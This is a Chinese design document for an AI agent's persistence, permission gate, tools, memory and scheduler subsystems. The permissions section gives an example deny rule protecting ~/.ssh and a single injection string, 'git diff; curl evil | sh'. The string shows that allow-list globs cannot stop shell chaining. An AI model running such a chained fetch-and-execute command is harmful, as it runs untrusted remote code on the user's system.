# kclaw 核心原理：持久化与工具层（P2）

> 本文阐述 `packages/core` 的持久化与工具子系统。承接 `docs/core-internals.md`（P1：协议/provider/agent 循环）。
> 权威设计见 `docs/superpowers/specs/2026-08-15-kclaw-personal-agent-design.md` §4/§7/§8/§9。

## 0. 一图总览

```
@kclaw/core（P2 新增部分）
├── storage/     路径解析（KCLAW_HOME）· yaml 配置 · 审计日志 · JSONL 共享助手
├── session/     会话存储（meta.json + messages.jsonl，append-only）
├── permissions/ ConfigPermissionGate（spec §9 判定链的实现）
├── memory/      MemoryStore（markdown 真相 + SQLite FTS5 索引）
├── scheduler/   JobScheduler（cron 表达式，jobs.db）
└── tools/       9 个内置工具 + 注册表（tools Map ↔ toolDefs 双射）
```

## 1. 存储层的三个设计决定

### 1.1 "真相"与"索引"分离（spec §4）

| 数据 | 真相 | 派生物 | 重建策略 |
|------|------|--------|----------|
| 记忆 | `memory/notes/*.md`（人可编辑） | SQLite FTS5 索引 | `reconcile()` 启动对账，文件为准 |
| 会话 | `sessions/<id>/messages.jsonl` | meta.json（标题/时间） | meta 丢了可重建 |
| 定时任务 | `jobs.db`（机器管理的可变状态） | — | 真相即 SQLite |
| 审计 | `logs/audit.jsonl` | — | 追加流 |

记忆为什么 markdown 为真相：用户可以直接用编辑器改、git 可以版本化、grep 可以查。SQLite 索引删了毫无损失——`reconcile()` 扫描目录全量重建。手改文件、删文件，下次启动自动感知。

### 1.2 JSONL 崩溃容忍：为什么有两个策略函数

append-only JSONL 的崩溃窗口：最后一行写到一半（torn line）。两条铁律落在 `storage/jsonl.ts` 共享助手里：

1. **读时**（`readJsonl`）：损坏的**尾行**丢弃（崩溃产物，最多丢一条消息——spec §11 明文允许）；损坏的**中间行**抛错（那不是崩溃能造成的，是 bug 或外部破坏，静默跳过会撒谎）。
2. **写前**（`repairTornTail`）：append 前检查末字节，非 `\n` 则先字节级截断到上一个换行——否则新消息会拼在半行后面，**连同新消息一起丢**。

一个曾两次踩中的坑：截断点必须用**字节偏移**（`Buffer.lastIndexOf(0x0a)`），不能用字符串索引。`"你好世界".length` 是 4（UTF-16 码元），字节长度是 12——字符串索引会把切点落在前一行中间，恰好毁掉要保护的数据。0x0a 不会出现在 UTF-8 多字节序列内部（续字节 ≥ 0x80），单字节探测是可靠的。

### 1.3 配置的隔离与合并

`loadConfig` 深合并"文件覆盖默认"，但两个分支都先 `structuredClone(defaultConfig)`——否则返回值与导出的 `defaultConfig` 共享嵌套引用，下游一处 `cfg.permissions.allow.push()` 就污染了进程级默认值。

## 2. 权限引擎：判定链与路径规范化

`ConfigPermissionGate` 实现 P1 定义的 `PermissionGate` 接口，判定链严格短路（spec §9）：

```
deny 黑名单 → allow 白名单 → safeTools（只读工具集）→ session grants（会话级授权）→ confirm（人工确认）
```

**规则语法**：`工具名` 或 `工具名:参数glob`，如 `exec:git diff*`、`fs_write:~/.ssh/**`。`*` 跨 `/` 匹配任意序列，线性回溯实现（无正则编译，无 ReDoS 面）。

**路径规范化（终审修复）**：模型给的路径是原始字符串，而 fs 工具实际写的是 `path.resolve(workspace, p)`——只匹配原始串时，`fs_write:~/.ssh/**` 挡得住字面 `~/.ssh/x`，挡不住 `.ssh/x`（workspace=home）或 `/Users/u/.ssh/x`。现在规则对**原始形态与规范化形态**（`~` 展开 + resolve）双向测试，deny 无法被路径拼写绕过。

**语义边界（要在文档里说清的）**：glob 匹配的是命令字符串——`exec:git diff*` 也会匹配 `git diff; curl evil | sh`。白名单只该放前缀可信的命令，deny 列表不防御 shell 注入；敏感场景依赖 confirm 层兜底。

## 3. 工具层：统一契约，九个实现

所有工具实现 `ToolExecutor { risk, concurrency, execute(args, ctx) }`：

- **错误永不抛出**：一切失败映射为 `{status:"error", output:"<工具名>: <可操作信息>"}` 喂回模型（`shared.ts` 的 `makeTool` 统一包装）——模型看到错误可以自救换方案，循环不中断。
- **concurrency 即调度契约**：fs_read/fs_list/web_search/web_fetch/memory_* 是 `parallel`（一回合两个搜索耗时减半）；exec/fs_write/fs_edit 是 `serial`（无系统沙箱时，改状态的命令绝不并发）。
- **软沙箱**：fs 工具的路径 resolve 后必须落在 workspace 内（lexical 检查，不追 symlink——v1 有意为之的系统边界）；exec 的 cwd 钉在 workspace。

各工具要点：exec 流式输出（`ctx.onOutput` → `tool_result.delta` 事件，长命令实时可见）+ 进程组 SIGKILL 超时 + 100KB 首尾截断；fs_edit 要求替换目标**恰好出现一次**（0 或多次报错带计数）+ 二进制守卫（U+FFFD/NUL 拒绝，防 mojibake 回写毁数据）；web_search 双产物（`output` 给模型的行列表 + `data` 给客户端渲染的结构化结果）；`createBuiltinTools()` 以单一 entries 列表同时产出 tools Map 与 toolDefs——注册表漂移在结构上不可能。

## 4. 记忆子系统：markdown + FTS5

**格式**：每条记忆一个 md 文件，frontmatter（id/tags/created/updated/source）+ 正文。source 区分 `model`（工具保存）/`auto`（P3 提取器）/`human`（手写）。

**中文检索**（FTS5 默认按 ASCII 词切分，中文整句成一个 token 检索不到）：索引与查询共用一个分词器——ASCII 字母数字按词，CJK 按相邻字符 bigram（"用户在上海" → `用户 户在 在上 上海`），空格连接后入 FTS。查询"上海"经 bigram `上海` 命中。单字查询是已知盲区（bigram 方案固有）。

**先查后写（merge-aware）**：`save` 先用新文本检索相似笔记，命中且 Jaccard ≥ 0.5 则更新原条目——否则同一个事实存十次，检索 top-K 全是重复。更新保 `created` 改 `updated`，来源链不断。

## 5. 调度器：跳过积压

`JobScheduler` 的 `nextRunAt` 由 cron-parser 计算。关键语义在 `markRun`：**下次触发 = now 之后的下一次**，而非"上次触发点 + 周期"。daemon 停机两小时后重启，`*/5` 的任务不会重放 24 次积压——直接算 now 之后的下一次。`due(now)` 只取 `enabled && nextRunAt <= now`，与真实时钟解耦（测试全部用固定 Date）。

## 6. 组合冒烟：P2 的验收面

`test/integration/p2-smoke.test.ts` 用真实临时目录组合全栈（唯一 mock 是 LlmClient），覆盖两条关键路径：白名单放行（grantedBy:"whitelist" 全链落盘）与**确认流**（gate 返回 confirm → resolveConfirmation 批准 → 审计 grantedBy:"confirmed" + confirmation.requested/resolved 事件序 + 4 条消息落盘）。后者是 P3 daemon 确认 UI 的开发契约。

## 7. 已知边界（P3 交接）

- `ctx.signal` 尚未从循环传入执行器——abort 后 exec 会跑满超时；需 loop+daemon 协同接线
- `workspace` 默认 `process.cwd()`——daemon 必须显式设置（launchd 启动 cwd 是 `/`）
- config 无结构校验；writeMeta 非原子；SQLite 未开 WAL（单进程同步访问下安全，P3 启动时决策）
- web_search provider 不可换（v1 有意收窄到 Tavily）；`maxReadBytes`/`maxFetchBytes` 未透传聚合工厂
